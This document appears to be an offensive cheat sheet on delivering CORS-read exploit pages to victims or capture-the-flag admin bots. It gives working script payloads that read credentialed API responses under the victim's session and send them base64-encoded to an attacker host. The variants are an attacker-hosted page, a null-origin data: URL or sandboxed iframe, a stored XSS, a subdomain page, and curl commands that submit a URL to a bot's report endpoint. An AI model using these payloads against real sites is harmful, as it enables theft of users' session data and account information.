# Delivery contexts — how the exploit page reaches the victim

A CORS read needs a page on a foreign origin making the fetch under
the victim's session. The page's delivery path.

---

## 1. The attacker-hosted page — the canonical delivery

```html
<!-- attacker.com/page -->
<script>
fetch('https://t/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>fetch('https://attacker/x?d='+btoa(JSON.stringify(d))))
</script>
```

Delivered via a link the victim clicks, a bot endpoint, or a
redirect — the page's fetch reads under the victim's session.

## 2. The `null`-origin delivery — a data: URL or sandbox

```html
<!-- a data: URL — its Origin is 'null' -->
data:text/html,<script>fetch('https://t/api/x',{credentials:'include'})
.then(r=>r.text()).then(d=>fetch('https://a/?d='+d))</script>
```

```html
<!-- a sandboxed iframe — Origin 'null' -->
<iframe sandbox="allow-scripts" src="data:text/html,<script>...</script>">
</iframe>
```

Passes a `null`-allowed CORS — and works when the victim can't reach
your domain (an airgapped bot).

## 3. The stored-XSS delivery — a page on the target itself

```html
<!-- a stored payload — same-origin, CORS-irrelevant -->
<script>fetch('/api/me').then(r=>r.json())
.then(d=>fetch('https://a/?d='+btoa(JSON.stringify(d))))</script>
```

A stored page on the target reads same-origin — the strongest
delivery; it subsumes the CORS question.

## 4. The subdomain delivery — a trusted `*.target.com`

```html
<!-- a page on sub.target.com — passes a subdomain-trust CORS -->
<script>fetch('https://target.com/api/x',{credentials:'include'})
.then(r=>r.json()).then(d=>fetch('https://a/?d='+btoa(JSON.stringify(d))))</script>
```

Host it via a subdomain XSS, a takeover, or a CTF-supplied sub.

## 5. The bot-delivery — the page reaches the viewer

```bash
# a bot endpoint — the page reads under the bot's session
curl -X POST "$BASE/report" -d 'url=https://attacker/page'
# a data: URL for an airgapped bot
curl -X POST "$BASE/report" -d 'url=data:text/html,<script>...</script>'
```

## 6. The open-redirect delivery — a trusted-domain bounce

```text
an open-redirect on a trusted origin bounces the victim to your page —
the fetch's Origin is still yours, but the delivery rides the trust.
```

## 7. The XSS-to-CORS-read — a same-origin read needs no CORS

```text
a reflected/stored XSS on the target reads /api/me same-origin —
CORS is irrelevant. CORS is the class when NO XSS exists but the
endpoint is still cross-origin readable.
```

## 8. The iframe-read delivery — an iframe + postMessage

```html
<iframe src="https://t/api/me"></iframe>
<!-- a same-origin iframe read — needs an XSS on the target;
     the CORS case reads via fetch, not iframe -->
```

## 9. The service-worker delivery — a persistent read

```js
// a service worker on the attacker page — intercepts+proxies
self.addEventListener('fetch',e=>{ /* forward to the target */ });
```

## 10. The CTF-bot context — the delivery that matters

```text
the bot: an admin/puppeteer context with a flag cookie or a
privileged session. the page must reach ITS fetch — via /report,
a stored page, or a data: URL — not your own browser.
```

## 11. The airgapped constraint — no external fetch

```text
a bot that can't fetch attacker.com — the exploit must be a
data: URL, a stored page, or a same-target vector. the exfil can
still be a beacon/img/fetch IF the bot can reach the listener —
or a page-side readback.
```

## 12. The readback-channel delivery

```text
the exfil: fetch('https://attacker/?d=...') — needs the bot to
reach attacker.com. when it can't: a page-side display, a DOM
write the bot screenshots, or an in-band channel.
```
